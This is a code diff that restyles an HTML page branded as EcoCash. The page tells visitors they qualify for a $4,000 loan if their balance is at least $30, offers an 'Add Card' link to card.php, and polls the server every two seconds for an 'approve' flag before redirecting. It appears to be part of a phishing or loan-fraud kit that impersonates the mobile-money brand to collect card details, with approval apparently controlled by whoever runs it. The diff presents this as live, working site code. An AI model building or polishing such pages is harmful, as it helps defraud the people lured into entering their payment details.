@@ -1,161 +1,216 @@
+```html
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>EcoCash | Qualification</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<title>EcoCash | Qualification</title>
+
 <style>
-body {
-    margin: 0;
-    background: #f1f5f9;
-    font-family: Arial, Helvetica, sans-serif;
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
 }
-.header {
-    text-align: center;
-    padding: 15px;
-    font-size: 20px;
-    font-weight: bold;
+
+body{
+    font-family:'Segoe UI',sans-serif;
+    background:linear-gradient(135deg,#eef4ff,#f8fafc);
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
 }
-.header span:first-child { color: red; }
-.header span:last-child { color: #2563eb; }
-.card {
-    max-width: 420px;
-    margin: 20px auto;
-    background: #fff;
-    padding: 25px;
-    border-radius: 18px;
-    box-shadow: 0 8px 25px rgba(0,0,0,.08);
+
+.card{
+    width:100%;
+    max-width:450px;
+    background:#fff;
+    border-radius:24px;
+    padding:30px;
+    box-shadow:0 15px 40px rgba(0,0,0,.08);
 }
-.title {
-    font-size: 18px;
-    font-weight: bold;
-    margin-bottom: 15px;
+
+.header{
+    text-align:center;
+    margin-bottom:25px;
 }
-.box {
-    background: #f8fafc;
-    padding: 14px;
-    border-radius: 10px;
-    margin-bottom: 12px;
-    font-size: 14px;
+
+.logo{
+    font-size:32px;
+    font-weight:800;
+    margin-bottom:8px;
 }
-.status {
-    color: green;
-    font-weight: bold;
+
+.logo .eco{
+    color:#e11d48;
 }
-.message-box {
-    background: #e6f7ec;
-    border-left: 5px solid #46b36a;
-    padding: 20px;
-    border-radius: 14px;
-    margin: 20px 0;
-    text-align: center;
+
+.logo .cash{
+    color:#2563eb;
 }
-.message-box h3 {
-    margin: 0 0 10px 0;
-    color: #1e7e34;
+
+.subtitle{
+    color:#6b7280;
+    font-size:14px;
 }
-.message-box p {
-    margin: 10px 0;
-    font-size: 15px;
-    color: #145c2e;
+
+.status-box{
+    background:#f8fafc;
+    border:1px solid #e5e7eb;
+    padding:16px;
+    border-radius:14px;
+    text-align:center;
+    margin-bottom:20px;
 }
-.reapply-btn {
-    display: inline-block;
-    background-color: #2563eb;
-    color: white;
-    padding: 10px 22px;
-    font-size: 14px;
-    font-weight: bold;
-    border: none;
-    border-radius: 30px;
-    text-decoration: none;
-    cursor: pointer;
-    margin-top: 5px;
-    transition: background 0.2s;
+
+.badge{
+    display:inline-block;
+    background:#dcfce7;
+    color:#15803d;
+    padding:8px 18px;
+    border-radius:50px;
+    font-size:14px;
+    font-weight:700;
 }
-.reapply-btn:hover {
-    background-color: #1d4ed8;
+
+.message-box{
+    background:linear-gradient(135deg,#ecfdf5,#d1fae5);
+    border-radius:18px;
+    padding:25px;
+    text-align:center;
+    margin-bottom:20px;
 }
-/* New button style for Add Card */
-.addcard-btn {
-    display: inline-block;
-    background-color: #10b981;   /* fresh green to differentiate */
-    color: white;
-    padding: 10px 22px;
-    font-size: 14px;
-    font-weight: bold;
-    border: none;
-    border-radius: 30px;
-    text-decoration: none;
-    cursor: pointer;
-    margin-top: 12px;            /* extra spacing below reapply button */
-    transition: background 0.2s;
+
+.icon{
+    width:70px;
+    height:70px;
+    background:#22c55e;
+    color:white;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:34px;
+    margin:0 auto 15px;
 }
-.addcard-btn:hover {
-    background-color: #059669;
+
+.message-box h2{
+    color:#166534;
+    margin-bottom:10px;
 }
-.footer {
-    text-align: right;
-    font-size: 11px;
-    color: #6b7280;
-    margin-top: 20px;
+
+.message-box p{
+    color:#14532d;
+    line-height:1.6;
+    margin-bottom:12px;
+}
+
+.loan-amount{
+    font-size:32px;
+    font-weight:800;
+    color:#16a34a;
+    margin:15px 0;
+}
+
+.buttons{
+    margin-top:20px;
+}
+
+.btn-success{
+    display:block;
+    width:100%;
+    text-decoration:none;
+    color:white;
+    padding:14px;
+    border-radius:14px;
+    font-weight:700;
+    text-align:center;
+    background:#10b981;
+    box-shadow:0 8px 20px rgba(16,185,129,.25);
+    transition:.3s;
+}
+
+.btn-success:hover{
+    background:#059669;
+    transform:translateY(-2px);
+}
+
+.footer{
+    text-align:center;
+    font-size:12px;
+    color:#94a3b8;
+    margin-top:20px;
 }
 </style>
 </head>
+
 <body>
 
-<div class="header">
-    <span>Eco</span><span>Cash</span>
-</div>
+<div class="card">
 
-    
-    <div class="box">
-        Account Status<br>
-        <span class="status">[Qualified]</span>
+    <div class="header">
+        <div class="logo">
+            <span class="eco">Eco</span><span class="cash">Cash</span>
+        </div>
+        <div class="subtitle">Financial Services</div>
+    </div>
+
+    <div class="status-box">
+        <p>Account Status</p>
+        <div class="badge">✓ Qualified</div>
     </div>
 
     <div class="message-box">
-        <h3>🎉 Congratulations!</h3>
-        <p>Your loan limit is <strong>$4,000</strong>.</p>
-        <p>Please reapply and ensure that your information is correct<br>
-        and your main account balance is at least <strong>$30</strong>.</p>
-        <p>Thank you.</p>
-        <!-- Reapply button (existing) -->
-    
-        <!-- NEW BUTTON: Add Card - redirects to card.php -->
-        <br>
-        <a href="card.php" class="addcard-btn">➕ Add Card</a>
+
+        <div class="icon">🎉</div>
+
+        <h2>Congratulations!</h2>
+
+        <p>Your approved loan limit is</p>
+
+        <div class="loan-amount">$4,000</div>
+
+        <p>
+            Please ensure your information is accurate
+            and your main account balance is at least
+            <strong>$30</strong>.
+        </p>
+
+        <p>Thank you for choosing EcoCash.</p>
+
+        <div class="buttons">
+            <a href="card.php" class="btn-success">
+                ➕ Add Card
+            </a>
+        </div>
+
     </div>
 
     <div class="footer">
-        EcoCash Financial
+        © 2025 EcoCash Financial
     </div>
+
 </div>
 
 <script>
-// Poll the server every 2 seconds to check the 'approve' status from the 'users' table
+// Poll server every 2 seconds
 function checkApproval() {
     fetch(window.location.href + '?check_approve=1')
         .then(response => response.json())
         .then(data => {
-            if (data.error) {
-                console.error('Polling error:', data.error);
-                return;
-            }
-            // If approve == 1, redirect to approved.php
             if (data.approve === 1) {
                 window.location.href = 'approved.php';
             }
         })
-        .catch(err => console.error('Fetch failed:', err));
+        .catch(err => console.error(err));
 }
 
-// Start polling every 2 seconds (2000 ms)
 setInterval(checkApproval, 2000);
-
-// Also run once immediately on page load
 checkApproval();
 </script>
 
 </body>
 </html>
+```
